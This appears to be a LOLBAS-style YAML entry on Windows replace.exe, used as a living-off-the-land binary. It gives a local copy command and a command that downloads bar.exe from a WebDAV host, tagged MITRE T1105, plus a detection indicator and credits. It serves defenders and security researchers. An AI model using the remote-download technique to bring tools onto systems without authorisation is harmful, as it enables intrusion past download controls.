---
Name: Replace.exe
Description: Used to replace file with another file
Author: 'Oddvar Moe'
Created: 2018-05-25
Commands:
  - Command: replace.exe C:\Source\File.cab C:\Destination /A
    Description: Copy file.cab to destination
    Usecase: Copy files
    Category: Copy
    Privileges: User
    MitreID: T1105
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
  - Command: replace.exe \\webdav.host.com\foo\bar.exe c:\outdir /A
    Description: Download/Copy bar.exe to outdir
    Usecase: Download file
    Category: Download
    Privileges: User
    MitreID: T1105
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
Full_Path:
  - Path: C:\Windows\System32\replace.exe
  - Path: C:\Windows\SysWOW64\replace.exe
Code_Sample:
  - Code:
Detection:
  - IOC: Replace.exe retrieving files from remote server
Resources:
  - Link: https://twitter.com/elceef/status/986334113941655553
  - Link: https://twitter.com/elceef/status/986842299861782529
Acknowledgement:
  - Person: elceef
    Handle: '@elceef'
---
